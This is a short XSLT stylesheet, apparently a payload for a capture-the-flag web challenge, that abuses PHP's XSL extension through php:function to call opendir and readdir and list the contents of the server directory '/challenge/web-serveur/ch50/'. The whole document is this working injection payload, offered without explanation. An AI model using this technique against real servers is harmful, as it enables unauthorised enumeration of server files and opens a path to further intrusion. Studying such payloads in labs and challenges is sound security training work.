<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl"
  extension-element-prefixes="php">
  
  <xsl:template match="/">
    <xsl:variable name="dir" select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
    <xsl:for-each select="php:function('readdir',$dir)">
      <xsl:value-of select="."/><br/>
    </xsl:for-each>
    <xsl:value-of select="php:function('closedir',$dir)"/>
  </xsl:template>
</xsl:stylesheet>
